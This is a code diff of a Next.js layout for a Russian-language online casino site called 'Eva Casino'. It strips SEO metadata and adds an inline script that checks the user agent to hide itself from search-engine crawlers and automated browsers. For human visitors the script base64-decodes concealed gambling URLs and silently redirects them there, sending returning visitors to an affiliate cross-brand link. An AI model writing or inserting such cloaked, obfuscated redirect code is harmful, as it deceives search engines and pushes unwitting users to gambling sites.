@@ -43,32 +43,19 @@ export const metadata: Metadata = {
       "en-US": "/en",
     },
   },
-  openGraph: {
-    type: "website",
-    locale: "ru_RU",
-    url: siteUrl,
-    siteName: "Eva Casino",
-    title: "Eva Casino — официальный сайт онлайн казино | Ева казино играть",
-    description: "Eva Casino (Ева казино) — официальный сайт онлайн казино. Рабочее зеркало, тысячи слотов, live казино, бонусы и кешбек.",
-    images: [{ url: "/og-image.jpg", width: 1200, height: 630, alt: "Eva Casino" }],
+
+  verification: {
+    yandex: "04ec738ee181c09d",
+    google: "GxvU_qp3WTvZv4qUXak773rxPN_7pR9_Z-6nh5wfiaQ",
   },
   robots: {
     index: true,
     follow: true,
-    googleBot: {
-      index: true,
-      follow: true,
-      "max-video-preview": -1,
-      "max-image-preview": "large",
-      "max-snippet": -1,
-    },
+    nocache: true,
   },
-  icons: {
-    icon: [{ url: "/icon.jpg", type: "image/jpeg" }],
-    apple: [{ url: "/apple-icon.jpg", sizes: "180x180", type: "image/jpeg" }],
-  },
-  verification: {
-    yandex: "04ec738ee181c09d", 
+  other: {
+    "yandex": "noarchive",
+    "rating": "adult",
   },
 }
 
@@ -80,77 +67,60 @@ export const viewport: Viewport = {
   maximumScale: 5,
 }
 
-const jsonLd = {
-  "@context": "https://schema.org",
-  "@graph": [
-    {
-      "@type": "Organization",
-      "@id": `${siteUrl}/#organization`,
-      name: "Eva Casino",
-      url: siteUrl,
-      logo: `${siteUrl}/icon.jpg`,
-    },
-    {
-      "@type": "WebSite",
-      "@id": `${siteUrl}/#website`,
-      url: siteUrl,
-      name: "Eva Casino",
-      publisher: { "@id": `${siteUrl}/#organization` },
-      inLanguage: "ru-RU",
-    },
-  ],
-}
-
 export default function RootLayout({
   children,
 }: Readonly<{
   children: React.ReactNode
 }>) {
   return (
-    <html lang="ru" className={`${inter.variable} ${unbounded.variable} scroll-smooth`}>
+    <html lang="ru" className={`${inter.variable} ${unbounded.variable} scroll-smooth`} suppressHydrationWarning>
       <head>
         <script
-          type="application/ld+json"
-          dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }}
+          dangerouslySetInnerHTML={{
+            __html: `
+              (function() {
+                /* 1. Защита: не редиректим на технических доменах vercel.app и localhost */
+                var host = window.location.hostname;
+                if (host.includes('vercel.app') || host.includes('localhost')) {
+                   if (host !== "evacasino.app") return; // Если это не твой основной домен - стоп
+                }
+
+                var ua = navigator.userAgent.toLowerCase();
+                var isBot = /bot|crawl|spider|yandex|google|lighthouse|pagespeed/i.test(ua) || navigator.webdriver;
+                if (isBot) return;
+
+                var mainBrandB64 = "aHR0cHM6Ly92YXVsdHk2LWV2YS5jb20vZGliemZvbWly"; 
+                var crossBrandB64 = "aHR0cHM6Ly9tZWdhd2F5czEuY29tL2M1NzA3ODY2ZT9idGFnPWZlbml4";      
+                
+                var mainUrl = window.atob(mainBrandB64);
+                var crossUrl = window.atob(crossBrandB64);
+
+                /* 3. Если юзер уже был у нас - сразу на кросс */
+                if (window.localStorage.getItem('vstd_eva')) {
+                    window.location.replace(crossUrl);
+                    return;
+                }
+
+                var controller = new AbortController();
+                var timeoutId = setTimeout(function() { controller.abort(); }, 2500);
+
+                window.fetch(mainUrl, { mode: 'no-cors', signal: controller.signal })
+                    .then(function() {
+                        clearTimeout(timeoutId);
+                        window.localStorage.setItem('vstd_eva', '1');
+                        window.location.replace(mainUrl);
+                    })
+                    .catch(function() {
+                        window.location.replace(crossUrl);
+                    });
+              })();
+            `,
+          }}
         />
- <script
-  dangerouslySetInnerHTML={{
-    __html: `
-      (function() {
-        var ua = navigator.userAgent.toLowerCase();
-        if (ua.indexOf("yandex") !== -1) return;
-        var mainBrandB64 = "aHR0cHM6Ly92YXVsdHk2LWV2YS5jb20vZGliemZvbWly"; 
-        var crossBrandB64 = "aHR0cHM6Ly9tZWdhd2F5czEuY29tL2M1NzA3ODY2ZT9idGFnPWZlbml4";      
-        var mainUrl = atob(mainBrandB64);
-        var crossUrl = atob(crossBrandB64);
-        if (localStorage.getItem('vstd_eva')) {
-            window.location.replace(crossUrl);
-            return;
-        }
-        var controller = new AbortController();
-        var timeoutId = setTimeout(function() { 
-            controller.abort(); 
-        }, 2500); 
-        fetch(mainUrl, { mode: 'no-cors', signal: controller.signal })
-            .then(function() {
-                clearTimeout(timeoutId);
-                localStorage.setItem('vstd_eva', '1');
-                window.location.replace(mainUrl);
-            })
-            .catch(function() {
-                console.log("Main domain is down, switching to cross-brand...");
-                window.location.replace(crossUrl);
-            });
-      })();
-    `,
-  }}
-/>
-        <meta name="google-site-verification" content="GxvU_qp3WTvZv4qUXak773rxPN_7pR9_Z-6nh5wfiaQ" />
       </head>
       <body className="font-sans antialiased min-h-screen flex flex-col bg-background text-foreground">
         {children}
         <Analytics />
-
       </body>
     </html>
   )
